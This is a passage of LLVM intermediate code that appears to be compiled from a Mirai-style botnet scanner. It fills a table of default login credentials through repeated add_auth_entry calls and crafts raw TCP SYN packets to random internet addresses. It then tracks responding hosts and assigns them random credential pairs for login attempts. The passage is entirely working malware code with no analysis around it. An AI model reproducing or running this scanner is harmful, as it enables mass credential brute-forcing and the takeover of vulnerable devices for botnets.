  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.80, i64 0, i64 0), i16 zeroext 5)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.61, i64 0, i64 0), i16 zeroext 7)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.81, i64 0, i64 0), i16 zeroext 1)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.82, i64 0, i64 0), i16 zeroext 1)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.83, i64 0, i64 0), i16 zeroext 7)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.84, i64 0, i64 0), i16 zeroext 1)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.26, i64 0, i64 0), i16 zeroext 1)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.85, i64 0, i64 0), i16 zeroext 4)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.86, i64 0, i64 0), i16 zeroext 5)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.87, i64 0, i64 0), i16 zeroext 2)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.88, i64 0, i64 0), i16 zeroext 7)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.89, i64 0, i64 0), i16 zeroext 5)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.90, i64 0, i64 0), i16 zeroext 15)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.91, i64 0, i64 0), i16 zeroext 6)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i64 0, i64 0), i16 zeroext 5)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.47, i64 0, i64 0), i16 zeroext 3)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.92, i64 0, i64 0), i16 zeroext 4)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.93, i64 0, i64 0), i16 zeroext 1)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.94, i64 0, i64 0), i16 zeroext 3)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.32, i64 0, i64 0), i16 zeroext 1)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.95, i64 0, i64 0), i16 zeroext 2)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.96, i64 0, i64 0), i16 zeroext 1)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.46, i64 0, i64 0), i16 zeroext 1)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.22, i64 0, i64 0), i16 zeroext 2)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.97, i64 0, i64 0), i16 zeroext 2)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.69, i64 0, i64 0), i16 zeroext 7)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.98, i64 0, i64 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.99, i64 0, i64 0), i16 zeroext 2)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.100, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.101, i64 0, i64 0), i16 zeroext 15)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.26, i64 0, i64 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.24, i64 0, i64 0), i16 zeroext 5)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.102, i64 0, i64 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.102, i64 0, i64 0), i16 zeroext 10)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.102, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.60, i64 0, i64 0), i16 zeroext 7)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.102, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.55, i64 0, i64 0), i16 zeroext 7)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.57, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.55, i64 0, i64 0), i16 zeroext 3)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.54, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.36, i64 0, i64 0), i16 zeroext 10)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.54, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.54, i64 0, i64 0), i16 zeroext 3)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.54, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.55, i64 0, i64 0), i16 zeroext 1)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.27, i64 0, i64 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.24, i64 0, i64 0), i16 zeroext 7)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.60, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.60, i64 0, i64 0), i16 zeroext 2)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.25, i64 0, i64 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.24, i64 0, i64 0), i16 zeroext 10)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.103, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.103, i64 0, i64 0), i16 zeroext 15)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.104, i64 0, i64 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.104, i64 0, i64 0), i16 zeroext 1)
  %55 = getelementptr inbounds [1514 x i8], [1514 x i8]* %6, i64 0, i64 0
  %56 = getelementptr inbounds [1514 x i8], [1514 x i8]* %6, i64 0, i64 20
  %57 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %2, i64 0, i32 0, i64 0
  %58 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %3, i64 0, i32 0, i64 0
  %59 = getelementptr inbounds %struct.timeval, %struct.timeval* %4, i64 0, i32 1
  %60 = getelementptr inbounds %struct.timeval, %struct.timeval* %4, i64 0, i32 0
  %61 = bitcast i32* %7 to i8*
  %62 = getelementptr inbounds [1514 x i8], [1514 x i8]* %6, i64 0, i64 16
  %63 = bitcast i8* %62 to i32*
  %64 = getelementptr inbounds [1514 x i8], [1514 x i8]* %6, i64 0, i64 9
  %65 = bitcast i8* %56 to i16*
  %66 = getelementptr inbounds [1514 x i8], [1514 x i8]* %6, i64 0, i64 22
  %67 = bitcast i8* %66 to i16*
  %68 = getelementptr inbounds [1514 x i8], [1514 x i8]* %6, i64 0, i64 32
  %69 = bitcast i8* %68 to i16*
  %70 = getelementptr inbounds [1514 x i8], [1514 x i8]* %6, i64 0, i64 28
  %71 = bitcast i8* %70 to i32*
  %72 = getelementptr inbounds [1514 x i8], [1514 x i8]* %6, i64 0, i64 12
  %73 = bitcast i8* %72 to i32*
  %74 = bitcast %struct.sockaddr_in* %5 to i8*
  %75 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 0
  %76 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 2, i32 0
  %77 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 1
  %78 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  br label %.loopexit266

.loopexit266.loopexit:                            ; preds = %.loopexit
  br label %.loopexit266

.loopexit266:                                     ; preds = %.loopexit266.loopexit, %43
  %.0240 = phi i32 [ undef, %43 ], [ %.1241, %.loopexit266.loopexit ]
  %79 = load i32, i32* @fake_time, align 4
  %80 = icmp eq i32 %79, %.0240
  br i1 %80, label %.loopexit269, label %.preheader268

.preheader268:                                    ; preds = %.loopexit266
  store i32 0, i32* %1, align 4
  br label %81

; <label>:81:                                     ; preds = %.preheader268, %81
  call void @llvm.memset.p0i8.i64(i8* nonnull %74, i8 0, i64 16, i32 4, i1 false)
  %82 = call i32 @rand_next() #9
  %83 = trunc i32 %82 to i16
  store i16 %83, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i64 0, i64 4) to i16*), align 4
  %84 = load i32, i32* @LOCAL_ADDR, align 4
  store i32 %84, i32* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i64 0, i64 12) to i32*), align 4
  %85 = call fastcc i32 @get_random_ip()
  store i32 %85, i32* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i64 0, i64 16) to i32*), align 16
  store i16 0, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i64 0, i64 10) to i16*), align 2
  %86 = call zeroext i16 @checksum_generic(i16* bitcast ([40 x i8]* @scanner_rawpkt to i16*), i32 20) #9
  store i16 %86, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i64 0, i64 10) to i16*), align 2
  store i16 %47, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i64 0, i64 22) to i16*), align 2
  %87 = load i32, i32* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i64 0, i64 16) to i32*), align 16
  store i32 %87, i32* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i64 0, i64 24) to i32*), align 8
  store i16 0, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i64 0, i64 36) to i16*), align 4
  %88 = call zeroext i16 @htons(i16 zeroext 20) #11
  %89 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* bitcast ([40 x i8]* @scanner_rawpkt to %struct.iphdr*), i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i64 0, i64 20), i16 zeroext %88, i32 20) #9
  store i16 %89, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i64 0, i64 36) to i16*), align 4
  store i16 2, i16* %75, align 4
  %90 = load i32, i32* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i64 0, i64 16) to i32*), align 16
  store i32 %90, i32* %76, align 4
  %91 = load i16, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i64 0, i64 22) to i16*), align 2
  store i16 %91, i16* %77, align 2
  %92 = load i32, i32* @rsck, align 4
  %93 = call i64 @sendto(i32 %92, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i64 0, i64 0), i64 40, i32 16384, %struct.sockaddr* nonnull %78, i32 16) #9
  %94 = load i32, i32* %1, align 4
  %95 = add nsw i32 %94, 1
  store i32 %95, i32* %1, align 4
  %96 = icmp slt i32 %95, 760
  br i1 %96, label %81, label %.loopexit269.loopexit

.loopexit269.loopexit:                            ; preds = %81
  br label %.loopexit269

.loopexit269:                                     ; preds = %.loopexit269.loopexit, %.loopexit266
  %.1241 = phi i32 [ %.0240, %.loopexit266 ], [ %79, %.loopexit269.loopexit ]
  %97 = tail call i32* @__errno_location() #11
  store i32 0, i32* %97, align 4
  %98 = load i32, i32* @rsck, align 4
  %99 = call i64 @recvfrom(i32 %98, i8* nonnull %55, i64 1514, i32 16384, %struct.sockaddr* null, i32* null) #9
  %100 = trunc i64 %99 to i32
  %101 = icmp slt i32 %100, 1
  br i1 %101, label %.thread, label %.lr.ph279.preheader

.lr.ph279.preheader:                              ; preds = %.loopexit269
  br label %.lr.ph279

.lr.ph279:                                        ; preds = %.lr.ph279.preheader, %.backedge
  %102 = phi i64 [ %146, %.backedge ], [ %99, %.lr.ph279.preheader ]
  %.0238278 = phi i32 [ %.0238.be, %.backedge ], [ 0, %.lr.ph279.preheader ]
  %103 = load i32, i32* %97, align 4
  %104 = icmp eq i32 %103, 11
  br i1 %104, label %.thread.loopexit319, label %105

; <label>:105:                                    ; preds = %.lr.ph279
  %sext = shl i64 %102, 32
  %106 = ashr exact i64 %sext, 32
  %107 = icmp ult i64 %106, 40
  br i1 %107, label %.backedge, label %108

; <label>:108:                                    ; preds = %105
  %109 = load i32, i32* %63, align 16
  %110 = load i32, i32* @LOCAL_ADDR, align 4
  %111 = icmp eq i32 %109, %110
  %112 = load i8, i8* %64, align 1
  %113 = icmp eq i8 %112, 6
  %or.cond294 = and i1 %111, %113
  %114 = load i16, i16* %65, align 4
  %115 = icmp eq i16 %114, %47
  %or.cond296 = and i1 %or.cond294, %115
  %116 = load i16, i16* %67, align 2
  %117 = icmp eq i16 %116, %40
  %or.cond298 = and i1 %or.cond296, %117
  br i1 %or.cond298, label %118, label %.backedge

; <label>:118:                                    ; preds = %108
  %119 = load i16, i16* %69, align 16
  %120 = and i16 %119, 5888
  %121 = icmp eq i16 %120, 4608
  br i1 %121, label %122, label %.backedge

; <label>:122:                                    ; preds = %118
  %123 = load i32, i32* %71, align 4
  %124 = call i32 @ntohl(i32 %123) #11
  %125 = add i32 %124, -1
  %126 = call i32 @htonl(i32 %125) #11
  %127 = load i32, i32* %73, align 4
  %128 = icmp eq i32 %126, %127
  br i1 %128, label %.preheader, label %.backedge

.preheader:                                       ; preds = %122
  %129 = icmp slt i32 %.0238278, 628
  br i1 %129, label %.lr.ph.preheader, label %.thread.loopexit319

.lr.ph.preheader:                                 ; preds = %.preheader
  %130 = sext i32 %.0238278 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %134
  %indvars.iv = phi i64 [ %130, %.lr.ph.preheader ], [ %indvars.iv.next, %134 ]
  %131 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i64 %indvars.iv, i32 16
  %132 = load i32, i32* %131, align 8
  %133 = icmp eq i32 %132, 0
  br i1 %133, label %136, label %134

; <label>:134:                                    ; preds = %.lr.ph
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %135 = icmp slt i64 %indvars.iv.next, 628
  br i1 %135, label %.lr.ph, label %.thread.loopexit

; <label>:136:                                    ; preds = %.lr.ph
  %137 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i64 %indvars.iv
  %138 = icmp eq %struct.scanner_connection* %137, null
  br i1 %138, label %.thread.loopexit319, label %139

; <label>:139:                                    ; preds = %136
  %140 = trunc i64 %indvars.iv to i32
  %141 = load i32, i32* %73, align 4
  %142 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i64 %indvars.iv, i32 15
  store i32 %141, i32* %142, align 4
  %143 = load i16, i16* %65, align 4
  %144 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i64 %indvars.iv, i32 13
  store i16 %143, i16* %144, align 8
  call fastcc void @setup_connection(%struct.scanner_connection* nonnull %137)
  br label %.backedge

.backedge:                                        ; preds = %139, %105, %108, %122, %118
  %.0238.be = phi i32 [ %.0238278, %105 ], [ %.0238278, %108 ], [ %.0238278, %122 ], [ %140, %139 ], [ %.0238278, %118 ]
  store i32 0, i32* %97, align 4
  %145 = load i32, i32* @rsck, align 4
  %146 = call i64 @recvfrom(i32 %145, i8* nonnull %55, i64 1514, i32 16384, %struct.sockaddr* null, i32* null) #9
  %147 = trunc i64 %146 to i32
  %148 = icmp slt i32 %147, 1
  br i1 %148, label %.thread.loopexit319, label %.lr.ph279

.thread.loopexit:                                 ; preds = %134
  br label %.thread

.thread.loopexit319:                              ; preds = %.preheader, %.lr.ph279, %.backedge, %136
  br label %.thread

.thread:                                          ; preds = %.thread.loopexit319, %.thread.loopexit, %.loopexit269
  %149 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %57) #9, !srcloc !3
  %150 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %58) #9, !srcloc !4
  store i32 0, i32* %1, align 4
  br label %151

; <label>:151:                                    ; preds = %.thread, %.thread257
  %.0242287 = phi i32 [ 0, %.thread ], [ %.1243, %.thread257 ]
  %.0244286 = phi i32 [ 0, %.thread ], [ %.1245, %.thread257 ]
  %storemerge248285 = phi i32 [ 0, %.thread ], [ %209, %.thread257 ]
  %152 = sext i32 %storemerge248285 to i64
  %153 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i64 %152
  %154 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i64 %152, i32 16
  %155 = load i32, i32* %154, align 8
  %156 = icmp eq i32 %155, 0
  br i1 %156, label %.thread257, label %157

; <label>:157:                                    ; preds = %151
  %158 = icmp ne i32 %155, 1
  %159 = select i1 %158, i32 30, i32 5
  %160 = load i32, i32* @fake_time, align 4
  %161 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i64 %152, i32 3
  %162 = load i32, i32* %161, align 4
  %163 = sub i32 %160, %162
  %164 = icmp ugt i32 %163, %159
  br i1 %164, label %165, label %181

; <label>:165:                                    ; preds = %157
  %166 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i64 %152, i32 2
  %167 = load i32, i32* %166, align 8
  %168 = icmp eq i32 %167, -1
  br i1 %168, label %.thread257, label %169

; <label>:169:                                    ; preds = %165
  %170 = call i32 @close(i32 %167) #9
  store i32 -1, i32* %166, align 8
  %171 = load i32, i32* %154, align 8
  %172 = icmp ugt i32 %171, 2
  %173 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i64 %152, i32 9
  br i1 %172, label %174, label %180

; <label>:174:                                    ; preds = %169
  %175 = load i8, i8* %173, align 4
  %176 = add i8 %175, 1
  store i8 %176, i8* %173, align 4
  %177 = icmp eq i8 %176, 10
  br i1 %177, label %178, label %179

; <label>:178:                                    ; preds = %174
  call void @fdclose(%struct.scanner_connection* nonnull %153, i32 undef)
  br label %.thread257

; <label>:179:                                    ; preds = %174
  call fastcc void @setup_connection(%struct.scanner_connection* nonnull %153)
  br label %.thread257

; <label>:180:                                    ; preds = %169
  store i8 0, i8* %173, align 4
  store i32 0, i32* %154, align 8
  br label %.thread257

; <label>:181:                                    ; preds = %157
  %.pr = load i32, i32* %154, align 8
  switch i32 %.pr, label %195 [
    i32 1, label %182
    i32 0, label %.thread257
  ]

; <label>:182:                                    ; preds = %181
  %183 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i64 %152, i32 2
  %184 = load i32, i32* %183, align 8
  %185 = srem i32 %184, 64
  %186 = zext i32 %185 to i64
  %187 = shl i64 1, %186
  %188 = sdiv i32 %184, 64
  %189 = sext i32 %188 to i64
  %190 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %3, i64 0, i32 0, i64 %189
  %191 = load i64, i64* %190, align 8
  %192 = or i64 %187, %191
  store i64 %192, i64* %190, align 8
  %193 = load i32, i32* %183, align 8
  %194 = icmp sgt i32 %193, %.0244286
  %..0244 = select i1 %194, i32 %193, i32 %.0244286
  br label %.thread257

; <label>:195:                                    ; preds = %181
  %196 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i64 %152, i32 2
  %197 = load i32, i32* %196, align 8
  %198 = srem i32 %197, 64
  %199 = zext i32 %198 to i64
  %200 = shl i64 1, %199
  %201 = sdiv i32 %197, 64
  %202 = sext i32 %201 to i64
  %203 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %2, i64 0, i32 0, i64 %202
  %204 = load i64, i64* %203, align 8
  %205 = or i64 %200, %204
  store i64 %205, i64* %203, align 8
  %206 = load i32, i32* %196, align 8
  %207 = icmp sgt i32 %206, %.0242287
  %..0242 = select i1 %207, i32 %206, i32 %.0242287
  br label %.thread257

.thread257:                                       ; preds = %151, %195, %182, %181, %180, %179, %178, %165
  %.1245 = phi i32 [ %.0244286, %165 ], [ %.0244286, %178 ], [ %.0244286, %179 ], [ %.0244286, %180 ], [ %..0244, %182 ], [ %.0244286, %181 ], [ %.0244286, %195 ], [ %.0244286, %151 ]
  %.1243 = phi i32 [ %.0242287, %165 ], [ %.0242287, %178 ], [ %.0242287, %179 ], [ %.0242287, %180 ], [ %.0242287, %182 ], [ %.0242287, %181 ], [ %..0242, %195 ], [ %.0242287, %151 ]
  %208 = load i32, i32* %1, align 4
  %209 = add nsw i32 %208, 1
  store i32 %209, i32* %1, align 4
  %210 = icmp slt i32 %209, 628
  br i1 %210, label %151, label %211

; <label>:211:                                    ; preds = %.thread257
  store i64 0, i64* %59, align 8
  store i64 1, i64* %60, align 8
  %212 = icmp sgt i32 %.1245, %.1243
  %213 = select i1 %212, i32 %.1245, i32 %.1243
  %214 = add nsw i32 %213, 1
  %215 = call i32 @select(i32 %214, %struct.__sigset_t* nonnull %2, %struct.__sigset_t* nonnull %3, %struct.__sigset_t* null, %struct.timeval* nonnull %4) #9
  %216 = call i64 @time(i64* null) #9
  %217 = trunc i64 %216 to i32
  store i32 %217, i32* @fake_time, align 4
  store i32 0, i32* %1, align 4
  br label %218

; <label>:218:                                    ; preds = %211, %.loopexit
  %storemerge249290 = phi i32 [ 0, %211 ], [ %551, %.loopexit ]
  %219 = sext i32 %storemerge249290 to i64
  %220 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i64 %219
  %221 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i64 %219, i32 2
  %222 = load i32, i32* %221, align 8
  %223 = icmp eq i32 %222, -1
  br i1 %223, label %.loopexit, label %224

; <label>:224:                                    ; preds = %218
  %225 = sdiv i32 %222, 64
  %226 = sext i32 %225 to i64
  %227 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %3, i64 0, i32 0, i64 %226
  %228 = load i64, i64* %227, align 8
  %229 = srem i32 %222, 64
  %230 = zext i32 %229 to i64
  %231 = shl i64 1, %230
  %232 = and i64 %228, %231
  %233 = icmp eq i64 %232, 0
  br i1 %233, label %254, label %234

; <label>:234:                                    ; preds = %224
  store i32 0, i32* %7, align 4
  store i32 4, i32* %8, align 4
  %235 = load i32, i32* %221, align 8
  %236 = call i32 @getsockopt(i32 %235, i32 1, i32 4, i8* nonnull %61, i32* nonnull %8) #9
  %237 = load i32, i32* %7, align 4
  %238 = icmp eq i32 %237, 0
  br i1 %238, label %244, label %239

; <label>:239:                                    ; preds = %234
  %240 = load i32, i32* %221, align 8
  %241 = call i32 @close(i32 %240) #9
  store i32 -1, i32* %221, align 8
  %242 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i64 %219, i32 9
  store i8 0, i8* %242, align 4
  %243 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i64 %219, i32 16
  store i32 0, i32* %243, align 8
  br label %.loopexit

; <label>:244:                                    ; preds = %234
  %245 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i64 %219, i32 16
  store i32 2, i32* %245, align 8
  %246 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i64 %219, i32 1, i32 0
  %247 = load i32, i32* %246, align 8
  %248 = icmp eq i32 %247, 0
  br i1 %248, label %249, label %252

; <label>:249:                                    ; preds = %244
  %250 = call fastcc %struct.scanner_auth* @random_auth_entry()
  %251 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %220, i64 0, i32 0
  store %struct.scanner_auth* %250, %struct.scanner_auth** %251, align 8
  br label %252

; <label>:252:                                    ; preds = %244, %249
  %253 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i64 %219, i32 4
  store i32 0, i32* %253, align 8
  br label %254

; <label>:254:                                    ; preds = %224, %252
  %255 = load i32, i32* %221, align 8
  %256 = sdiv i32 %255, 64
  %257 = sext i32 %256 to i64
  %258 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %2, i64 0, i32 0, i64 %257
  %259 = load i64, i64* %258, align 8
  %260 = srem i32 %255, 64
  %261 = zext i32 %260 to i64
  %262 = shl i64 1, %261
  %263 = and i64 %262, %259
  %264 = icmp eq i64 %263, 0
  br i1 %264, label %.loopexit, label %.thread263.preheader

.thread263.preheader:                             ; preds = %254
  %265 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i64 %219, i32 16
  %266 = load i32, i32* %265, align 8
  %267 = icmp eq i32 %266, 0
  br i1 %267, label %.loopexit, label %.lr.ph289

.lr.ph289:                                        ; preds = %.thread263.preheader
  %268 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i64 %219, i32 4
  %269 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i64 %219, i32 7, i64 0
  %270 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i64 %219, i32 7, i64 6144
  %271 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i64 %219, i32 7, i64 0
  %272 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i64 %219, i32 3
  %273 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %220, i64 0, i32 0
  %274 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %220, i64 0, i32 0
  %275 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i64 %219, i32 9
  %276 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i64 %219, i32 5
  %277 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i64 %219, i32 1, i32 0
  %278 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i64 %219, i32 8, i64 0
  %279 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i64 %219, i32 1, i32 0
  %280 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i64 %219, i32 9
  %281 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i64 %219, i32 15
